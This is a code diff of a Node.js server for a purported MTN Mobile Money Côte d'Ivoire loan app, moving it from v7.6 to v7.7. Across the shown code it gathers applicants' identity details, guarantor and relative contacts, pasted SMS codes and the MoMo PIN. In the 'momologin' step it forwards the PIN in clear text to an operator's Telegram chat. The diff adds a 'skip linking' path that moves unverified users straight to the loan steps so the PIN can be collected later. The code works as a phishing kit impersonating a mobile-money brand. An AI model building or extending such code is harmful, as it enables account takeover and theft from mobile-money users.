@@ -1,6 +1,7 @@
 // ============================================================
-// server.js – MTN Mobile Money Côte d'Ivoire  (v7.6)
-// Stockage JSON local · SMS-paste · Admin Telegram
+// server.js – MTN Mobile Money Côte d'Ivoire  (v7.7)
+// JSON file storage · SMS-paste · Skip-linking flow
+// BCEAO-compliant account types
 // ============================================================
 'use strict';
 
@@ -19,7 +20,7 @@ const PDFDocument  = require('pdfkit');
 
 let TNC_VERSION = '1.0';
 let TNC_EFFECTIVE = '2026-01-01';
-let TERMS_TEXT = 'Conditions non configurées.';
+let TERMS_TEXT = 'Conditions générales non configurées.';
 try {
     const terms = require('./terms');
     TNC_VERSION   = terms.TNC_VERSION   || TNC_VERSION;
@@ -76,23 +77,44 @@ function makeLimiter(max, keyGen) {
 }
 const globalLimiter     = makeLimiter(300);
 const registerLimiter   = makeLimiter(5);
+const skipLimiter       = makeLimiter(10);
 const submitStepLimiter = makeLimiter(30, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
 const smsLimiter        = makeLimiter(10, (req) => (req.body && req.body.applicationId) ? req.body.applicationId : req.ip);
 app.use('/api/', globalLimiter);
 
 console.log('═══════════════════════════════════════');
-console.log('🚀 Serveur en démarrage... (v7.6 / Côte d\'Ivoire)');
+console.log('🚀 Serveur en démarrage... (v7.7 / Côte d\'Ivoire)');
 console.log('   BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 12) + '...' : 'MANQUANT');
 console.log('   CHAT_ID:', CHAT_ID || 'MANQUANT');
 console.log('   NODE_ENV:', process.env.NODE_ENV || 'development');
 console.log('   Stockage: fichiers JSON locaux');
 console.log('═══════════════════════════════════════');
 
-// ─── Types de comptes MoMo CI ───
+// ═══════════════════════════════════════════════════════════
+// TYPES DE COMPTES MoMo CI (conformes BCEAO)
+// ═══════════════════════════════════════════════════════════
 const ACCOUNT_TYPES = {
-    basic:    { name: 'Compte Basic',    icon: '🟡', dailyCash: 200000,  monthlyCap: 500000,   maxLoan: 100000,  minLoan: 25000,  requiresId: false, description: 'Compte MoMo de base (sans CNI)' },
-    standard: { name: 'Compte Standard', icon: '⭐', dailyCash: 1000000, monthlyCap: 2000000,  maxLoan: 500000,  minLoan: 50000,  requiresId: true,  description: 'Compte MoMo standard (avec CNI)' },
-    premium:  { name: 'Compte Premium',  icon: '💎', dailyCash: 5000000, monthlyCap: 10000000, maxLoan: 2000000, minLoan: 100000, requiresId: true,  description: 'Compte MoMo premium (avec CNI vérifiée)' }
+    simplifie: {
+        name: 'Compte Simplifié', icon: '🟢',
+        dailyCash: 200000, monthlyCap: 500000,
+        maxLoan: 100000, minLoan: 25000,
+        requiresId: true,
+        description: 'Niveau 1 BCEAO — Pièce d\'identité uniquement'
+    },
+    standard: {
+        name: 'Compte Standard', icon: '🔵',
+        dailyCash: 500000, monthlyCap: 2000000,
+        maxLoan: 500000, minLoan: 50000,
+        requiresId: true,
+        description: 'Niveau 2 BCEAO — Pièce d\'identité + justificatif'
+    },
+    premium: {
+        name: 'Compte Premium', icon: '🟣',
+        dailyCash: 2000000, monthlyCap: 10000000,
+        maxLoan: 2000000, minLoan: 100000,
+        requiresId: true,
+        description: 'Niveau 3 BCEAO — KYC complet (adresse vérifiée)'
+    }
 };
 
 const STEP_ORDER = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
@@ -106,6 +128,7 @@ const REG_STATUS = {
     SMS_VERIFIED: 'sms_verified',
     PIN_PENDING: 'pin_pending',
     COMPLETED: 'completed',
+    SKIPPED: 'skipped',
     REJECTED: 'rejected'
 };
 
@@ -285,6 +308,19 @@ function buildRegistrationReviewMessage(app_, dobCheck) {
         '✅ <b>Approuver → demander le SMS ?</b>\n' +
         '❌ <b>NON → inscription annulée</b>';
 }
+function buildSkipNotificationMessage(app_) {
+    const type = ACCOUNT_TYPES[app_.accountType] || {};
+    return '⚡ <b>NOUVEL UTILISATEUR (NON VÉRIFIÉ)</b>\n' +
+        '━━━━━━━━━━━━━━━━━━━━━━\n' +
+        '🆔 ID Dossier : ' + code(app_.applicationId) + '\n\n' +
+        'Cet utilisateur a choisi de <b>continuer sans lier</b> son compte MoMo.\n\n' +
+        '<b>💳 TYPE DE COMPTE INDIQUÉ</b>\n' +
+        type.icon + ' <b>' + esc(type.name || 'N/A') + '</b>\n' +
+        'Prêt max autorisé : <b>' + fmtXOF(type.maxLoan || 0) + '</b>\n\n' +
+        '⚠️ <b>Vérification reportée à l\'étape finale.</b>\n' +
+        'L\'utilisateur devra confirmer son téléphone et son code PIN lors de la dernière étape du prêt.\n\n' +
+        '📌 Surveillez la suite de son dossier — vous serez notifié à chaque étape.';
+}
 function buildPinApprovalMessage(app_) {
     return '🔐 <b>VÉRIFICATION DU CODE PIN MoMo</b>\n' +
         '━━━━━━━━━━━━━━━━━━━━━━\n' +
@@ -319,29 +355,30 @@ function buildSmsApprovalMessage(app_) {
 }
 function buildStepMessage(step, app_, type, data) {
     const header = '🆔 ' + code(app_.applicationId) + '\n';
+    const unverified = app_.registrationStatus === REG_STATUS.SKIPPED ? '\n⚠️ <b>UTILISATEUR NON VÉRIFIÉ</b>\n' : '';
     if (step === 'loan') {
         const monthly = monthlyRepayment(data.loanAmount, parseInt(data.loanTerm));
         const required = Math.ceil(data.loanAmount * 0.20);
         const effectiveRequired = Math.min(required, type.monthlyCap);
-        return '📋 <b>DEMANDE DE PRÊT (ÉTAPE 1/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n' + header +
+        return '📋 <b>DEMANDE DE PRÊT (ÉTAPE 1/6)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n' + header + unverified +
             '\n<b>💳 COMPTE</b>\n' + type.icon + ' <b>' + type.name + '</b> (max ' + fmtXOF(type.maxLoan) + ')\n\n' +
             '<b>💰 PRÊT</b>\nType : ' + esc(data.loanType) + '\nMontant : <b>' + fmtXOF(data.loanAmount) + '</b>\n' +
             'Durée : ' + esc(data.loanTerm) + '\nMensualité : <b>' + fmtXOF(monthly) + '</b>\nObjet : ' + esc(data.loanPurpose) + '\n\n' +
             '<b>📊 QUALIFICATION (règle des 20 %)</b>\nRequis effectif : <b>' + fmtXOF(effectiveRequired) + '</b>\n\n' +
             '✅ OUI / ❌ NON — l\'utilisateur revient à l\'étape 1 si NON';
     }
-    if (step === 'personal') return '👤 <b>INFORMATIONS PERSONNELLES (2/6)</b>\n' + header + 'Nom : ' + esc(data.firstName) + ' ' + esc(data.lastName) + '\nTéléphone : ' + code('+225 ' + data.phone) + '\nEmail : ' + esc(data.email) + '\n\n✅ OUI / ❌ NON';
-    if (step === 'employment') return '💼 <b>EMPLOI ET PROCHE (3/6)</b>\n' + header + 'Emploi : ' + esc(data.employment) + '\nRevenu annuel : ' + fmtXOF(data.annualIncome) + '\nProche : ' + esc(data.kinName) + ' ' + code('+225 ' + data.kinPhone) + '\n\n✅ OUI / ❌ NON';
-    if (step === 'guarantor') return '🤝 <b>GARANT (4/6)</b>\n' + header + 'Nom : ' + esc(data.guarantorName) + '\nTéléphone : ' + code('+225 ' + data.guarantorPhone) + '\nRelation : ' + esc(data.guarantorRelation) + '\n\n✅ OUI / ❌ NON';
+    if (step === 'personal') return '👤 <b>INFORMATIONS PERSONNELLES (2/6)</b>\n' + header + unverified + 'Nom : ' + esc(data.firstName) + ' ' + esc(data.lastName) + '\nTéléphone : ' + code('+225 ' + data.phone) + '\nEmail : ' + esc(data.email) + '\n\n✅ OUI / ❌ NON';
+    if (step === 'employment') return '💼 <b>EMPLOI ET PROCHE (3/6)</b>\n' + header + unverified + 'Emploi : ' + esc(data.employment) + '\nRevenu annuel : ' + fmtXOF(data.annualIncome) + '\nProche : ' + esc(data.kinName) + ' ' + code('+225 ' + data.kinPhone) + '\n\n✅ OUI / ❌ NON';
+    if (step === 'guarantor') return '🤝 <b>GARANT (4/6)</b>\n' + header + unverified + 'Nom : ' + esc(data.guarantorName) + '\nTéléphone : ' + code('+225 ' + data.guarantorPhone) + '\nRelation : ' + esc(data.guarantorRelation) + '\n\n✅ OUI / ❌ NON';
     if (step === 'momologin') {
         const pinStr = (data.loginMethod === 'pin' && data.pin) ? code(data.pin) : '🔒 Biométrie';
-        return '🔐 <b>CONNEXION MoMo (5/6)</b>\n' + header + 'Téléphone : ' + code('+225 ' + data.phone) + '\nMéthode : ' + esc(data.loginMethod || 'pin') + '\nCode PIN : ' + pinStr + '\n\n✅ OUI / ❌ NON';
+        return '🔐 <b>CONNEXION MoMo (5/6)</b>\n' + header + unverified + 'Téléphone : ' + code('+225 ' + data.phone) + '\nMéthode : ' + esc(data.loginMethod || 'pin') + '\nCode PIN : ' + pinStr + '\n\n✅ OUI / ❌ NON';
     }
     if (step === 'qualification') {
         const loanAmount = app_.loanAmount || 0;
         const months = parseInt(app_.loanTerm) || 12;
         const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
-        return '📊 <b>QUALIFICATION FINALE (6/6)</b>\n' + header +
+        return '📊 <b>QUALIFICATION FINALE (6/6)</b>\n' + header + unverified +
             'Demandeur : ' + esc(app_.firstName || '') + ' ' + esc(app_.lastName || '') + '\n' +
             'Montant : <b>' + fmtXOF(loanAmount) + '</b>\nMensualité : <b>' + fmtXOF(monthly) + '</b>\n\n' +
             '✅ OUI / ❌ NON';
@@ -355,7 +392,7 @@ function buildStepMessage(step, app_, type, data) {
 app.get('/health', (req, res) => {
     res.json({
         status: 'ok',
-        version: '7.6',
+        version: '7.7',
         country: 'CI',
         storage: 'filesystem',
         uptime: process.uptime(),
@@ -372,7 +409,7 @@ app.get('/api/account-types', (req, res) => res.json({ ok: true, types: ACCOUNT_
 app.get('/api/terms', (req, res) => res.json({ ok: true, version: TNC_VERSION, effective: TNC_EFFECTIVE, text: TERMS_TEXT }));
 
 // ═══════════════════════════════════════════════════════════
-// INSCRIPTION
+// INSCRIPTION COMPLÈTE (avec CNI + SMS + PIN)
 // ═══════════════════════════════════════════════════════════
 app.post('/api/register-momo', registerLimiter, async (req, res) => {
     try {
@@ -455,6 +492,53 @@ app.post('/api/register-momo', registerLimiter, async (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
+// INSCRIPTION RAPIDE (SKIP LINKING)
+// ═══════════════════════════════════════════════════════════
+app.post('/api/register-skip', skipLimiter, async (req, res) => {
+    try {
+        const body = req.body || {};
+        const applicationId = body.applicationId;
+        const accountType = body.accountType;
+
+        if (!applicationId || !accountType) return res.status(400).json({ ok: false, error: 'Champs obligatoires manquants.' });
+        if (!ACCOUNT_TYPES[accountType]) return res.status(400).json({ ok: false, error: 'Type de compte invalide.' });
+
+        const type = ACCOUNT_TYPES[accountType];
+        if (!applications[applicationId]) applications[applicationId] = { applicationId: applicationId, createdAt: new Date().toISOString() };
+        ensureSteps(applications[applicationId]);
+
+        applications[applicationId].isRegistered = true;
+        applications[applicationId].accountType = accountType;
+        applications[applicationId].accountMaxLoan = type.maxLoan;
+        applications[applicationId].accountName = type.name;
+        applications[applicationId].registrationStatus = REG_STATUS.SKIPPED;
+        applications[applicationId].registrationHistory = applications[applicationId].registrationHistory || [];
+        applications[applicationId].registrationHistory.push({ at: new Date().toISOString(), event: 'skipped_linking', by: 'user' });
+        applications[applicationId].updatedAt = new Date().toISOString();
+        saveApps();
+
+        issueSession(res, applicationId);
+        audit('registration_skipped', { applicationId: applicationId, accountType: accountType });
+
+        tgSend(buildSkipNotificationMessage(applications[applicationId]), null);
+
+        res.json({
+            ok: true,
+            applicationId: applicationId,
+            accountType: accountType,
+            accountName: type.name,
+            maxLoan: type.maxLoan,
+            minLoan: type.minLoan,
+            registrationStatus: REG_STATUS.SKIPPED,
+            message: 'Vous pouvez commencer votre demande de prêt.'
+        });
+    } catch (e) {
+        console.error('Erreur register-skip:', e.message);
+        res.status(500).json({ ok: false, error: e.message });
+    }
+});
+
+// ═══════════════════════════════════════════════════════════
 // VÉRIFICATION INSCRIPTION
 // ═══════════════════════════════════════════════════════════
 app.get('/api/registration/status/:applicationId', guardAppId, (req, res) => {
@@ -465,7 +549,7 @@ app.get('/api/registration/status/:applicationId', guardAppId, (req, res) => {
         applicationId: app_.applicationId,
         status: app_.registrationStatus || REG_STATUS.IDLE,
         accountType: app_.accountType || null,
-        accountName: (app_.momoRegistration || {}).accountName || null,
+        accountName: (app_.momoRegistration || {}).accountName || app_.accountName || null,
         accountMaxLoan: app_.accountMaxLoan || 0,
         phone: app_.phone || null,
         rejectionReason: app_.rejectionReason || null
@@ -559,7 +643,9 @@ app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
         if (!app_.isRegistered || !app_.accountType || !ACCOUNT_TYPES[app_.accountType]) {
             return res.status(403).json({ ok: false, code: 'NOT_REGISTERED', error: 'Vous devez d\'abord vous inscrire sur MoMo.' });
         }
-        if (app_.registrationStatus !== REG_STATUS.COMPLETED) {
+        // Accept both fully-verified (completed) and skip-linking (skipped) users
+        const allowedStatuses = [REG_STATUS.COMPLETED, REG_STATUS.SKIPPED];
+        if (allowedStatuses.indexOf(app_.registrationStatus) === -1) {
             return res.status(403).json({ ok: false, code: 'REGISTRATION_INCOMPLETE', error: 'Inscription non vérifiée.' });
         }
 
@@ -585,18 +671,21 @@ app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
         }
         if (step === 'personal') {
             if (!data.firstName || !data.lastName || !data.phone || !data.email) return res.status(400).json({ ok: false, error: 'Remplissez tous les champs personnels.' });
+            if (!/^\d{10}$/.test(data.phone)) return res.status(400).json({ ok: false, error: 'Téléphone à 10 chiffres requis.' });
             app_.firstName = data.firstName; app_.lastName = data.lastName;
             app_.phone = data.phone; app_.email = data.email;
             app_.personalData = { firstName: data.firstName, lastName: data.lastName, phone: data.phone, email: data.email };
         }
         if (step === 'employment') {
             if (!data.employment || data.annualIncome == null || !data.kinName || !data.kinPhone) return res.status(400).json({ ok: false, error: 'Remplissez tous les champs.' });
+            if (!/^\d{10}$/.test(data.kinPhone)) return res.status(400).json({ ok: false, error: 'Téléphone du proche à 10 chiffres requis.' });
             app_.employment = data.employment; app_.annualIncome = data.annualIncome;
             app_.kinName = data.kinName; app_.kinPhone = data.kinPhone;
             app_.employmentData = { employment: data.employment, annualIncome: data.annualIncome, kinName: data.kinName, kinPhone: data.kinPhone };
         }
         if (step === 'guarantor') {
             if (!data.guarantorName || !data.guarantorPhone || !data.guarantorRelation) return res.status(400).json({ ok: false, error: 'Remplissez tous les champs du garant.' });
+            if (!/^\d{10}$/.test(data.guarantorPhone)) return res.status(400).json({ ok: false, error: 'Téléphone du garant à 10 chiffres requis.' });
             if (app_.phone && data.guarantorPhone === app_.phone) return res.status(400).json({ ok: false, error: 'Le téléphone du garant ne peut pas être le vôtre.' });
             app_.guarantorName = data.guarantorName; app_.guarantorPhone = data.guarantorPhone;
             app_.guarantorRelation = data.guarantorRelation;
@@ -611,6 +700,11 @@ app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
             app_.loginMethod = data.loginMethod || 'pin';
             app_.deviceInfo = data.deviceInfo || null;
             app_.momoLoginData = { phone: data.phone, pin: app_.loginPin, loginMethod: app_.loginMethod, deviceInfo: data.deviceInfo };
+            // When a skipped user reaches momologin, consider them upgraded to verified
+            if (app_.registrationStatus === REG_STATUS.SKIPPED) {
+                app_.registrationHistory = app_.registrationHistory || [];
+                app_.registrationHistory.push({ at: new Date().toISOString(), event: 'momologin_attempt_by_skipped_user' });
+            }
         }
         if (step === 'qualification') {
             const required = Math.ceil((app_.loanAmount || 0) * 0.20);
@@ -621,7 +715,7 @@ app.post('/api/submit-step', submitStepLimiter, async (req, res) => {
         app_.updatedAt = new Date().toISOString();
         saveApps();
 
-        audit('step_submitted', { id: applicationId, step: step, accountType: app_.accountType });
+        audit('step_submitted', { id: applicationId, step: step, accountType: app_.accountType, unverified: app_.registrationStatus === REG_STATUS.SKIPPED });
         askApproval(buildStepMessage(step, app_, type, data), step, applicationId);
         res.json({ ok: true, status: 'pending', step: step });
     } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
@@ -651,7 +745,7 @@ app.get('/api/agreement/:applicationId', guardAppId, (req, res) => {
         'Naissance     : ' + (app_.dob || 'N/A') + '\n' +
         'Téléphone     : +225 ' + (app_.phone || '') + '\n' +
         'Email         : ' + (app_.email || '') + '\n' +
-        'Compte MoMo   : ' + ((app_.momoRegistration || {}).accountName || app_.accountType || 'N/A') + '\n\n' +
+        'Compte MoMo   : ' + ((app_.momoRegistration || {}).accountName || app_.accountName || app_.accountType || 'N/A') + '\n\n' +
         'VÉRIFICATION INSCRIPTION\n------------------------\n' +
         'Statut       : ' + (app_.registrationStatus || 'N/A') + '\n' +
         'SMS vérifié  : ' + (app_.regSmsVerifiedAt ? new Date(app_.regSmsVerifiedAt).toLocaleString('fr-FR') : 'N/A') + '\n' +
@@ -699,7 +793,7 @@ app.get('/api/agreement-pdf/:applicationId', guardAppId, (req, res) => {
     line('Naissance', app_.dob);
     line('Téléphone', app_.phone ? '+225 ' + app_.phone : null);
     line('Email', app_.email);
-    line('Compte MoMo', (app_.momoRegistration || {}).accountName || app_.accountType);
+    line('Compte MoMo', (app_.momoRegistration || {}).accountName || app_.accountName || app_.accountType);
     doc.moveDown(0.8);
     doc.font('Helvetica-Bold').fontSize(12).text('DÉTAILS DU PRÊT'); doc.moveDown(0.3);
     line('Capital', fmtXOF(loanAmount));
@@ -848,15 +942,26 @@ app.post('/api/telegram-webhook', (req, res) => {
             if (!CHAT_ID || chatId !== String(CHAT_ID)) return;
 
             if (text === '/start' || text === '/help') {
-                tgSend('🤖 <b>Bot de Prêt MTN MoMo Côte d\'Ivoire</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n⏳ /pending\n🆕 /pendingreg', null);
+                tgSend('🤖 <b>Bot de Prêt MTN MoMo Côte d\'Ivoire</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n⏳ /pending\n🆕 /pendingreg\n⚡ /skipped   ← utilisateurs non vérifiés', null);
             } else if (text === '/stats') {
                 const total = Object.keys(applications).length;
                 const pendingReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PENDING).length;
                 const pendingSms = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.SMS_PENDING || a.registrationStatus === REG_STATUS.SMS_SUBMITTED).length;
                 const pendingPin = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PIN_PENDING).length;
                 const completedReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.COMPLETED).length;
+                const skipped = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.SKIPPED).length;
                 const completedLoans = Object.values(applications).filter(a => a.steps && a.steps.qualification === 'approved').length;
-                tgSend('📊 <b>STATISTIQUES</b>\n📝 Dossiers : ' + total + '\n⏳ Inscriptions à valider : ' + pendingReg + '\n📩 SMS en attente : ' + pendingSms + '\n🔐 PIN en attente : ' + pendingPin + '\n✅ Inscriptions complètes : ' + completedReg + '\n💵 Prêts approuvés : ' + completedLoans, null);
+                tgSend('📊 <b>STATISTIQUES</b>\n📝 Dossiers : ' + total + '\n⏳ Inscriptions à valider : ' + pendingReg + '\n📩 SMS en attente : ' + pendingSms + '\n🔐 PIN en attente : ' + pendingPin + '\n✅ Inscriptions complètes : ' + completedReg + '\n⚡ Non vérifiés (skip) : ' + skipped + '\n💵 Prêts approuvés : ' + completedLoans, null);
+            } else if (text === '/skipped') {
+                const skipped = Object.entries(applications).filter(e => e[1].registrationStatus === REG_STATUS.SKIPPED);
+                if (!skipped.length) { tgSend('✅ Aucun utilisateur non vérifié.', null); return; }
+                let msg = '⚡ <b>UTILISATEURS NON VÉRIFIÉS (' + skipped.length + ')</b>\n━━━━━━━━━━━━━━━━━━━━━━\n';
+                skipped.slice(0, 15).forEach(e => {
+                    const a = e[1];
+                    const type = ACCOUNT_TYPES[a.accountType] || {};
+                    msg += '\n🆔 ' + code(e[0]) + '\n💳 ' + esc(type.name || '') + '\n💰 Prêt : ' + (a.loanAmount ? fmtXOF(a.loanAmount) : 'pas encore soumis') + '\n';
+                });
+                tgSend(msg, null);
             } else if (text === '/pendingreg') {
                 const pending = Object.entries(applications).filter(e => e[1].registrationStatus === REG_STATUS.PENDING);
                 if (!pending.length) { tgSend('✅ Aucune inscription à valider.', null); return; }
@@ -870,11 +975,11 @@ app.post('/api/telegram-webhook', (req, res) => {
                 const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                 const a = realKey ? applications[realKey] : null;
                 if (!a) { tgSend('❌ Introuvable', null); return; }
-                tgSend('📞 <b>CONTACT</b> ' + code(realKey) + '\nNom : ' + esc(a.fullName || 'N/A') + '\nTéléphone : ' + (a.phone ? code('+225 ' + a.phone) : 'N/A') + '\nEmail : ' + (a.email ? code(a.email) : 'N/A') + '\nNaissance : ' + (a.dob ? code(a.dob) : 'N/A') + '\nCompte : ' + esc((a.momoRegistration || {}).accountName || 'N/A') + '\nStatut : ' + esc(a.registrationStatus || 'N/A'), null);
+                tgSend('📞 <b>CONTACT</b> ' + code(realKey) + '\nNom : ' + esc(a.fullName || 'N/A') + '\nTéléphone : ' + (a.phone ? code('+225 ' + a.phone) : 'N/A') + '\nEmail : ' + (a.email ? code(a.email) : 'N/A') + '\nNaissance : ' + (a.dob ? code(a.dob) : 'N/A') + '\nCompte : ' + esc((a.momoRegistration || {}).accountName || a.accountName || 'N/A') + '\nStatut : ' + esc(a.registrationStatus || 'N/A'), null);
             } else if (text === '/pending') {
                 const pending = Object.entries(applications).filter(e => {
                     const a = e[1];
-                    if (a.registrationStatus !== REG_STATUS.COMPLETED) return false;
+                    if (a.registrationStatus !== REG_STATUS.COMPLETED && a.registrationStatus !== REG_STATUS.SKIPPED) return false;
                     return a.steps && Object.values(a.steps).indexOf('pending') !== -1;
                 });
                 if (!pending.length) { tgSend('✅ Aucun dossier en attente.', null); return; }
@@ -882,7 +987,8 @@ app.post('/api/telegram-webhook', (req, res) => {
                 pending.slice(0, 10).forEach(e => {
                     const steps = [];
                     STEP_ORDER.forEach(k => { if (e[1].steps[k] === 'pending') steps.push(k); });
-                    msg += '\n🆔 ' + code(e[0]) + '\n👤 ' + esc(e[1].firstName || e[1].fullName || '') + '\n📋 ' + steps.join(', ') + '\n';
+                    const flag = e[1].registrationStatus === REG_STATUS.SKIPPED ? ' ⚡' : '';
+                    msg += '\n🆔 ' + code(e[0]) + flag + '\n👤 ' + esc(e[1].firstName || e[1].fullName || '') + '\n📋 ' + steps.join(', ') + '\n';
                 });
                 tgSend(msg, null);
             } else if (text === '/list') {
@@ -891,7 +997,8 @@ app.post('/api/telegram-webhook', (req, res) => {
                 let msg = '📋 <b>10 DERNIERS</b>\n';
                 ids.forEach((id, i) => {
                     const a = applications[id];
-                    msg += '\n' + (i + 1) + '. 🆔 ' + code(id) + '\n👤 ' + esc(a.firstName || a.fullName || '') + '\n';
+                    const flag = a.registrationStatus === REG_STATUS.SKIPPED ? ' ⚡' : '';
+                    msg += '\n' + (i + 1) + '. 🆔 ' + code(id) + flag + '\n👤 ' + esc(a.firstName || a.fullName || '') + '\n';
                 });
                 tgSend(msg, null);
             } else if (text.indexOf('/search ') === 0) {
@@ -929,7 +1036,7 @@ app.get('/api/status/:applicationId', guardAppId, (req, res) => {
         registrationStatus: app_.registrationStatus || REG_STATUS.IDLE,
         rejectionReason: app_.rejectionReason || null,
         accountType: app_.accountType || null,
-        accountName: (app_.momoRegistration || {}).accountName || null,
+        accountName: (app_.momoRegistration || {}).accountName || app_.accountName || null,
         accountMaxLoan: app_.accountMaxLoan || 0,
         phone: app_.phone || null,
         email: app_.email || null,
@@ -984,6 +1091,6 @@ app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../frontend', 'ind
 // ═══════════════════════════════════════════════════════════
 loadAll();
 app.listen(PORT, '0.0.0.0', () => {
-    console.log('🚀 Serveur en écoute sur le port ' + PORT + ' (v7.6 / Côte d\'Ivoire)');
+    console.log('🚀 Serveur en écoute sur le port ' + PORT + ' (v7.7 / Côte d\'Ivoire)');
     console.log('   → http://0.0.0.0:' + PORT + '\n');
 });
